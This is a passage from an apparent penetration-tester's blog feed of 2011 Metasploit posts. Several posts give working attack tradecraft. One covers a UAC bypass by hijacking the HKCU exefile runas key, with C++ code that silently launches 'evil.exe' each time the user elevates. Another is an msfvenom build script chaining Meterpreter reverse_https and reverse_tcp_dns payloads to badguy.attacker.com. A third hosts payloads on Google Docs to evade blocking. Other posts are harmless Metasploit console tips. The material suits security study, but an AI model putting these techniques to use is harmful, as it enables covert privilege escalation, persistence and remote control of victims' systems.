&lt;pre&gt;&lt;code&gt;client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],])
client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;lsquo;evil.exe&amp;rsquo; with Administrative privs. If they are not &amp;ldquo;Admins&amp;rdquo; themselves then it would prompt them for the user name and password (normally the case in systems attached to domains). Something to be aware of: If your evil.exe is not code-signed the UAC box will be orange instead of blue. You can get around this a bit by using rundll32.exe (which is signed ;-) ) as is svchost.exe. (You may also want to not name it evil.exe)&lt;/p&gt;

&lt;p&gt;The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn&amp;rsquo;t do anything to cause it. Users are generally as smart as bait, but it&amp;rsquo;s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game.&lt;/p&gt;

&lt;p&gt;Number 1 I&amp;rsquo;ll leave to another post, so lets solve #2.&lt;/p&gt;

&lt;p&gt;When a &amp;ldquo;runas&amp;rdquo; ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I&amp;rsquo;d like to point out is the HKLM\Software\Classes\exefile key. The &amp;lsquo;exefile&amp;rsquo; as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the &amp;ldquo;shell\open&amp;rdquo;, &amp;ldquo;shell\runas&amp;rdquo; and &amp;ldquo;shell\runasuser&amp;rdquo; subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside &amp;ldquo;shellopencommand&amp;rdquo; the default string has &amp;ldquo;%1&amp;rdquo; %*  - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don&amp;rsquo;t do it, Windows doesn&amp;rsquo;t like you afterwards, trust me, and remember to snapshot if you don&amp;rsquo;t).&lt;/p&gt;

&lt;p&gt;Great, but how does this help us, we aren&amp;rsquo;t admins. HKCU is writable by the &amp;lsquo;Current User&amp;rsquo; hence the name, and it so happens to have a very similar registry path: HKCU\Software\Classes. Depending on your system, it may or may not have a &amp;ldquo;exefile&amp;rdquo; subkey. If it doesn&amp;rsquo;t it&amp;rsquo;s pretty easy to create. Lets make it match the &amp;ldquo;runas&amp;rdquo; one in HKLM&lt;/p&gt;

&lt;p&gt;The tree should look something like this when you are done:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;HKLM

&lt;ul&gt;
&lt;li&gt;Software

&lt;ul&gt;
&lt;li&gt;Classes

&lt;ul&gt;
&lt;li&gt;exefile

&lt;ul&gt;
&lt;li&gt;shell

&lt;ul&gt;
&lt;li&gt;runas

&lt;ul&gt;
&lt;li&gt;command&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Under command change the default value to &amp;ldquo;%1&amp;rdquo; %* just as it is in HKLM, and add a new String value called &amp;lsquo;IsolatedCommand&amp;rsquo; with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the &amp;lsquo;IsolatedCommand&amp;rsquo; String to &amp;lsquo;notepad.exe&amp;rsquo; and attempt to &amp;lsquo;Run As Administrator&amp;rsquo; on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won&amp;rsquo;t work, and they&amp;rsquo;ll try it again, and start investigating the problem, which we don&amp;rsquo;t want them to do.&lt;/p&gt;

&lt;p&gt;Enter &amp;lsquo;runyou.exe&amp;rsquo;, it&amp;rsquo;s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;#include &amp;quot;windows.h&amp;quot;
#include &amp;quot;stdio.h&amp;quot;
#include &amp;quot;tchar.h&amp;quot;

int _tmain(int argc, _TCHAR* argv[])
{
    if (argv[1])
    {
        ShellExecuteW(NULL,NULL,argv[1],NULL,NULL,SW_SHOW);
        if (argv[2])
        {
            ShellExecuteW(NULL,NULL,argv[2],NULL,NULL,SW_HIDE);
        }
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code executes the first program visibly and then the second hidden. You probably see where this is going, but we change our IsolatedCommand String to runyou.exe %1 evil.exe and now we give them exactly what they want in an elevated state, but also get our evil binary there too ;-)&lt;/p&gt;

&lt;p&gt;The very real down side to this is you have to wait for the user to use UAC (this does not work if someone else does, it&amp;rsquo;s only for the current user HKCU). But, as a side benefit, it&amp;rsquo;s a very real form of sneaky persistence as well, as it will execute our evil binary every single time they use UAC.&lt;/p&gt;

&lt;p&gt;Game Over&amp;hellip; ;-)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Run POST Modules On All Sessions</title>
      <link>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</link>
      <pubDate>Wed, 02 Nov 2011 03:06:18 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jcran&#34;&gt;Jcran&lt;/a&gt; recently blogged about an easy way to run a post module on all sessions:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.pentestify.com/simple-framework-domain-token-scanner&#34;&gt;http://blog.pentestify.com/simple-framework-domain-token-scanner&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
msf enum_domain_tokens&amp;gt; irb
framework.sessions.each do |session|
  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.&lt;/p&gt;

&lt;p&gt;Thinking back toÂ &lt;a href=&#34;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&#34;&gt;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&lt;/a&gt; and my rapid file PSEXEC resource file, we know we can run ruby inside of resource files with the &lt;ruby&gt; tag.&lt;/p&gt;

&lt;p&gt;Save the following as runall.rc somewhere where you&amp;rsquo;ll remember:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each do |session|
  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
  print_status(&amp;quot;Running #{active_module.fullname} against session #{session.first}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then when you want to run a POST module against every session you have you simply do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
msf enum_domain_tokens&amp;gt; resource runall.rc
[*] Running post/windows/gather/enum_domain_tokens on session 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-11-06 20:05 by Rob Fuller&lt;/p&gt;

&lt;p&gt;A commenter noticed an error in the coding for cross compatibility. The following should work better across versions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each_key do |session|
  run_single(&amp;quot;set SESSION #{session}&amp;quot;)
  print_status(&amp;quot;Running #{active_module.fullname} against session #{session}&amp;quot;)
  run_single(&amp;quot;run&amp;quot;)
  sleep 1
end
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>MSFConsole Prompt Fiddling</title>
      <link>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</link>
      <pubDate>Sun, 09 Oct 2011 06:20:22 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-09-msfconsole-prompt-fiddling/</guid>
      <description>&lt;p&gt;In @&lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;carnal0wnage&lt;/a&gt; and my presentation at &lt;a href=&#34;http://www.derbycon.com/&#34;&gt;DerbyCon&lt;/a&gt; 2011 we talked about using &lt;a href=&#34;http://linux.die.net/man/1/screen&#34;&gt;SCREEN&lt;/a&gt; and &lt;a href=&#34;http://linux.die.net/man/1/script&#34;&gt;SCRIPT&lt;/a&gt; to keep connections live / use them across SSH sessions, and log everything that happens. What we didn&amp;rsquo;t cover is the fact that there isn&amp;rsquo;t a time stamp for those logs. Now, Metasploit has multiple ways of creating logs:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat ~/.msf4/logs/framework.log&lt;/code&gt;

&lt;ul&gt;
&lt;li&gt;This log automatically logs all of the error data that is great for trouble shooting when something is working, but doesn&amp;rsquo;t record what you are doing inside of msfconsole&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;msf&amp;gt; spool ~/myclient.log&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The spool command is great for logging output from anything you do in either consoles or sessions, even when you drop to a shell. My one gripe about this one is that it doesn&amp;rsquo;t log the actual command you issued.
*&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; set ConsoleLogging true  
msf&amp;gt; set LogLevel 5  
msf&amp;gt; set SessionLogging true  
msf&amp;gt; set TimestampOutput true
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;These combined essentially do the same thing as spool except that they go into different logs, but do actually log the command you issued&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Plenty of logging right? But none of them really &amp;lsquo;log everything&amp;rsquo; and time stamps are not a regular occurrence in them. Cool, but we need both. We&amp;rsquo;ve got the &amp;lsquo;log everything&amp;rsquo; with the Linux &amp;lsquo;script&amp;rsquo; command, we just need a way to inject time stamps into our log.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Enter the ever mutable &amp;lsquo;msf&amp;gt;&amp;rsquo; prompt:&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;A lesser known variable in MSFConsole is &amp;lsquo;PROMPT&amp;rsquo;. You can set this pretty much like any other OS can, however there are some metasploit specific things you can add. Using a three letter abbreviation you can even add color to it.&lt;/p&gt;

&lt;p&gt;For example lets add our hostname to our prompt:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;msf&amp;gt; set PROMPT %H&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;changes msf&amp;gt; to myhostname&amp;gt;&lt;/p&gt;

&lt;p&gt;And you can combine and add things that you wish:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;set PROMPT %H Just more text %U&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;changes the prompt to:  myattackmachine Just more text mubix&amp;gt; (%U is username)&lt;/p&gt;

&lt;p&gt;For reference here are the other working % variables that I know of:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;%D&lt;/strong&gt; = Current local directory (not sure if this changes when in meterpreter or not for the victims dir, that would be cool)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%H&lt;/strong&gt; = Host name (again, would be cool if this changed when in meterpreter)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%J&lt;/strong&gt; = Current number of jobs running&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%L&lt;/strong&gt; = Local IP (makes it easy to remember what to put in LHOST)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%S&lt;/strong&gt; = Currently number of sessions open&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%T&lt;/strong&gt; = Time stamp&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;%U&lt;/strong&gt; = Username (yes, would be awesome if this changed in meterpreter too)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now if you wanted to add colors to that, all you would do is use something like %grn%T to make the time stamp green. You&amp;rsquo;ll have to play around with the color&amp;rsquo;s names as I don&amp;rsquo;t know them all. %red %blu %blk etc&amp;hellip;&lt;/p&gt;

&lt;p&gt;Combine all of that with script and you&amp;rsquo;ve got something awesome. I set my PROMPT to:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; set PROMPT %T S:%S J:%J
1970-01-01 00:00:00 +0000 S:0 J:0&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This gives me the number of jobs and sessions and has the time stamp every time I throw a command, so in my logs I can very easily narrow down the exact time when I did or didnt&amp;rsquo; do something. The number of sessions and jobs are just good to know items.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;Throw in one more trick to make the whole thing a cake walk:&lt;/strong&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;In your ~/.msf4 directory, if you haven&amp;rsquo;t already, create a file called &amp;lsquo;msfconsole.rc&amp;rsquo;. This magical file will run every time you start msfconsole (&lt;em&gt;with the express exception of when you specify a resource file to run from the command line using the -r argument&lt;/em&gt;). Throw your &amp;lsquo;set PROMPT %blah %blah %blah&amp;rsquo; in there formatted however you like, and now whenever you start msfconsole you&amp;rsquo;ll have your handy dandy timestamp.&lt;/p&gt;

&lt;p&gt;Shout out to @&lt;a href=&#34;http://twitter.com/egyp7&#34;&gt;egyp7&lt;/a&gt; for showing me this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class</title>
      <link>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</link>
      <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
      <description>

&lt;h4 id=&#34;video&#34;&gt;Video:&lt;/h4&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/xXqyogdxITE&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides:&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix/the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-class-9530403&#34;&gt;The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class&lt;/a&gt;&lt;/strong&gt; [slideshare id=9530403]&lt;/p&gt;

&lt;h4 id=&#34;code&#34;&gt;Code:&lt;/h4&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1b</title>
      <link>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</link>
      <pubDate>Sun, 17 Jul 2011 07:49:34 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-07-17-metasploit-payloads-explained-part-1b/</guid>
      <description>&lt;p&gt;This series was interrupted a bit by the new Metasploit HTTP/HTTPS payloads (&lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication&#34;&gt;more info&lt;/a&gt;). Definitely not complaining though as the new features *(as will be discussed in part 2) are some epic new additions to the payloads list. However an important change happened while the craziness over the new payloads was going on. ScriptJunkie snuck in an awesome change to msfvenom (a.k.a. msffsm).&lt;/p&gt;

&lt;p&gt;Here is the link to the ticket about the change (&lt;a href=&#34;https://dev.metasploit.com/redmine/issues/4714&#34;&gt;link&lt;/a&gt;) and the revision (&lt;a href=&#34;https://dev.metasploit.com/redmine/projects/framework/repository/revisions/13057&#34;&gt;r13057&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL;DR version&lt;/strong&gt;: This change allows you to put multiple payloads into one binary&amp;hellip; ya.. awesomesauce.&lt;/p&gt;

&lt;p&gt;He gives the following example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ruby msfvenom -p windows/messagebox -f raw EXITFUNC=thread &amp;gt; /tmp/msgbox.raw
ruby msfvenom -p windows/meterpreter/reverse_tcp -f raw -t /tmp/msgbox.raw -k LHOST=192.168.0.102 EXITFUNC=thread &amp;gt; /tmp/rev102msgbox.raw
ruby msfvenom -p - -f exe &amp;lt; /tmp/rev102msgbox.raw &amp;gt; /tmp/rev102msgbox.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This example when &amp;lsquo;rev102msgbox.exe&amp;rsquo; is run will pop up a message box with the default options (Hello, from MSF!) and throw a reverse)tcp connection to 192.168.0.102 over the default port of 4444.&lt;/p&gt;

&lt;p&gt;This is great as an example and a good way to test to see if things are working, but I don&amp;rsquo;t normally like to inform my victims that I&amp;rsquo;m there by saying hello (especially if I&amp;rsquo;m not there to see their faces).&lt;/p&gt;

&lt;p&gt;So I thought that this would be a great way of throwing a bunch of payloads together to try a few of the tried and true ways of getting past restrictive networks all in one binary. I started off with 3 payloads:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;reverse_tcp_dns to port 7815&lt;/li&gt;
&lt;li&gt;reverse_tcp_dns to port 80&lt;/li&gt;
&lt;li&gt;reverse_https to port 443&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I chose those because I can change the DNS to point to a new IP address in future without having to regenerate my binary and size really isn&amp;rsquo;t a concern since I won&amp;rsquo;t be using it in an exploit.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(&lt;strong&gt;SIDE NOT&lt;/strong&gt;E: The motive for the port 7815 one is because sometimes there are proxy settings for port 80 and 443 &lt;em&gt;which the new HTTP/HTTPS payloads can handle (&amp;lsquo;cept for Auth proxies)&lt;/em&gt; but for some reason quite regularly companies will still allow odd ports to fly through unencumbered)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Here is what I did:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &amp;gt; /tmp/stage1.raw
./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com LPORT=80 -c /tmp/stage1.raw &amp;gt; /tmp/stage2.raw
./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com LPORT=7815 -c /tmp/stage2.raw &amp;gt; /tmp/stage3.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Luckily (and you&amp;rsquo;ll see why in a second) I forgot to set up a multi/handler on port 7815, which caused me to notice an issue. When one of the payloads failed to connect, &amp;lsquo;&lt;strong&gt;ExitProcess&lt;/strong&gt;&amp;rsquo; was called, causing all of my payloads to die prematurely (even if they had already gotten the second stage).&lt;/p&gt;

&lt;p&gt;I tried setting &lt;strong&gt;AutoRunScript&lt;/strong&gt; to &amp;lsquo;migrate -f&amp;rsquo; so that the payloads would migrate out into a new Notepad process. But the connection died too quickly and none of the payloads were fast enough at jumping ship.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;ReverseConnectRetries&lt;/strong&gt; to the rescue. This is an advanced setting for the reverse_tcp family (ipv6_tcp, nonx_tcp, ord_tcp, tcp, tcp_allports, tcp_dns) which tells the payload how many times to loop through the initial connection. This setting defaults to 5 but can be anything between 1 and 255. The 255 setting is special since it actually sets an infinite loop. Sweet, now our sinking should never call the ExitProcess command right? Not quite, reverse_https and reverse_http doesn&amp;rsquo;t have this setting. We are still in a bit of a race condition if we want to use those payloads but it is a race we can win now at least.&lt;/p&gt;

&lt;p&gt;I wrote a very simple batch file to generate my new binary when I need it (also so I don&amp;rsquo;t have to remember all the commands):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

echo Building Stage 1
./msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=badguy.attacker.com LPORT=443 &amp;gt; /tmp/stage1.raw

echo Building Stage 2
./msfvenom -p windows/meterpreter/reverse_tcp_dns -f raw LHOST=badguy.attacker.com ReverseConnectRetries=255 LPORT=80 -c /tmp/stage1.raw &amp;gt; /tmp/stage2.raw

echo Building Stage 3
./msfvenom -p windows/meterpreter/reverse_tcp_dns -f exe LHOST=badguy2.attacker.com ReverseConnectRetries=255 LPORT=7815 -c /tmp/stage2.raw &amp;gt; /tmp/stage3.exe

echo Cleaning up...
rm -rf /tmp/stage1.raw /tmp/stage2.raw

echo Done..
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Plus it tells you whats going on and does a bit of clean up, leaving you with just your hydra-binary. One of the things I thought about adding was the cmd/windows/adduser payload just so if the user is an admin we can start our day off without having to add ourselves a user but I decided against it just for clean up and &amp;ldquo;noise&amp;rdquo; purposes.&lt;/p&gt;

&lt;p&gt;(You&amp;rsquo;ll also notice that one of the payloads is going somewhere else.. no reason to not give your payloads every chance of getting out) Sharing is caring right?&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1a</title>
      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</link>
      <pubDate>Sun, 26 Jun 2011 17:47:23 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1a/</guid>
      <description>&lt;p&gt;In Part 1 I gave an example I used at CCDC with the single &amp;lsquo;windows/download_exec&amp;rsquo;. One of the down sides of that payload is you need to host the binary, giving up an IP/host that can be blocked. Well, Google recently (a couple months ago) allowed people to upload &amp;lsquo;anything&amp;rsquo; to Google docs. And you can then share these files publicly. Probably already see where I&amp;rsquo;m going with this, but here are some steps to get it going, first upload your malicious binary (not the dropper &amp;lsquo;windows/download_exec&amp;rsquo;, but the file it needs to execute). I assume you don&amp;rsquo;t need a picture to find the upload button ;-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201106_payloads1a_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Next, go to Action -&amp;gt; Share -&amp;gt; Share and make it public:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201106_payloads1a_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You&amp;rsquo;ll get a link that says docs.google.com / leaf?id= something:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201106_payloads1a_3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Go to that link and copy the link that says &amp;lsquo;Download&amp;rsquo;&lt;/p&gt;

&lt;p&gt;You should have something like this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://docs.google.com/uc?id=XXXXXXXX&amp;amp;export=download&amp;amp;hl=en_US&#34;&gt;https://docs.google.com/uc?id=XXXXXXXX&amp;amp;export=download&amp;amp;hl=en_US&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Remove everything after the &amp;amp; and change https to http (download_exec can&amp;rsquo;t talk SSL) so you have something that looks like:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://docs.google.com/uc?id=XXXXXXXX&#34;&gt;http://docs.google.com/uc?id=XXXXXXXX&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now use that link in the URL option when you generate your &amp;lsquo;windows/download_exec&amp;rsquo; binary and you should be good to go. You can still change your binary on the fly by right clicking the file in your Google Docs list and selecting &amp;ldquo;Add or manage revisions&amp;rdquo;. Plus you get the added bonus of being virtually unblockable.&lt;/p&gt;

&lt;p&gt;One thing to be careful of is the download a &amp;lsquo;leaf&amp;rsquo; link are still live if you put the files in the &amp;lsquo;trash&amp;rsquo; on Google Docs, you need to empty the trash for them to be completely offline.&lt;/p&gt;

&lt;p&gt;Incident Responders, if you find something making these requests, switch the UC portion of the download back to &amp;lsquo;leaf&amp;rsquo; and you can find out when it was uploaded, and have the ability to &amp;ldquo;Report Abusive Content&amp;rdquo; which if that account continues to do &amp;lsquo;bad stuff&amp;rsquo; it will get looked into by Google.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Payloads Explained - Part 1</title>
      <link>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</link>
      <pubDate>Sun, 26 Jun 2011 15:00:00 +0000</pubDate>
      
      <guid>https://malicious.link/post/2011/2011-06-26-metasploit-payloads-explained-part-1/</guid>
      <description>&lt;p&gt;Payload selection is something that rarely gets talked about in detail. Most PoCs just use calc.exe, netcat, or some kind of socket. The vast majority of Metasploit tutorials, videos and documentation use the _&lt;strong&gt;windows/meterpreter/reverse_tcp&lt;/strong&gt;_ payload which is only one of 224 possible payloads. Here is a little disclaimer: While the payloads in Metasploit don&amp;rsquo;t get updated as much as other parts of Metasploit, this is a point in time documentation of them (June 23, 2011) and the payloads available in Metasploit are constantly changing. I challenge you to continue to do a &amp;lsquo;show payloads&amp;rsquo; and see what&amp;rsquo;s new.&lt;/p&gt;

&lt;p&gt;If you issue &amp;lsquo;show payloads&amp;rsquo; at the base of Metasploit&amp;rsquo;s console (msf&amp;gt;), it will show you every payload that Metasploit has available. However, exploit module writers can help the user out a bit with their selection by putting special limiters inside of their module. These limiters can be as specific as pointing out a specific payload, or as broad as specifying that it will only work with a &amp;lsquo;windows&amp;rsquo; payload. For a decent example of this in action check out the JBoss &amp;lsquo;bshdeployer&amp;rsquo; exploit module (&lt;strong&gt;modules/exploits/multi/http/jboss_bshdeployer.rb&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;The payloads Metasploit has are broken down into &amp;lsquo;&lt;strong&gt;staged&lt;/strong&gt;&amp;rsquo;, &amp;lsquo;&lt;strong&gt;stagers&lt;/strong&gt;&amp;rsquo;, and &amp;lsquo;**singles &lt;strong&gt;(also known as Inline)&amp;lsquo;. The difference between &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; and &amp;lsquo;&lt;/strong&gt;stagers&lt;strong&gt;&amp;rsquo; is pretty simple, &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; payloads use tiny &amp;lsquo;&lt;/strong&gt;stagers&lt;strong&gt;&amp;rsquo; to be able to fit into small exploitation spaces. During exploitation the exploit developer often has a very limited amount of memory they can manipulate through the programs inputs that they are exploiting. The stagers go in this space and their only job is to pull down the rest of the &amp;lsquo;&lt;/strong&gt;staged&lt;strong&gt;&amp;rsquo; payload. The downside to these types of payloads is they require a connection to something that will shovel them the rest of the payload. Inline payloads or &amp;lsquo;&lt;/strong&gt;singles**&amp;rsquo; don&amp;rsquo;t have this problem. They are self contained and do what they are designed to do without any assistance.&lt;/p&gt;

&lt;p&gt;All of the payloads in Metasploit use the one, the only, Multi Handler. I call it that because of how I call it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;msf&amp;gt; use multi/handler
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It is a fitting title though as it is equipped to handle every single payload inside of Metasploit no matter what the architecture or type of connection being made. It knows how to deal with each type of payload because you tell it what to expect, but that doesn&amp;rsquo;t take away from the fact that in this single utility lies the crucial stepping stone for all of Metasploit&amp;rsquo;s exploitation.&lt;/p&gt;

&lt;p&gt;The structure of most payloads tell you exactly what they do, but not always. If it says in the description that it&amp;rsquo;s &amp;lsquo;&lt;strong&gt;Inline&lt;/strong&gt;&amp;rsquo; that means it is a single, if it says &amp;lsquo;&lt;strong&gt;Stager&lt;/strong&gt;&amp;rsquo; that means it&amp;rsquo;s staged. Lets break a few down of the lesser known ones:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cmd/windows/adduser&lt;/code&gt; - This is a single that executes &amp;lsquo;net user /add&amp;rsquo; with the username and password you specify. This one doesn&amp;rsquo;t say that it&amp;rsquo;s &amp;lsquo;Inline&amp;rsquo; but all of the &amp;lsquo;cmd/&lt;em&gt;&amp;rsquo; or &amp;lsquo;&lt;/em&gt;/exec&amp;rsquo; payloads are singles.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;osx/armle/vibrate&lt;/code&gt; - A single that when executed on an iPhone, it vibrates.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;generic/debug_trap&lt;/code&gt; - Trips a debugger if it&amp;rsquo;s attached to the process (sends a single xCC &amp;lsquo;break&amp;rsquo; byte)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;One thing that isn&amp;rsquo;t immediately obvious is another marker of staged vs. singles:&lt;/p&gt;

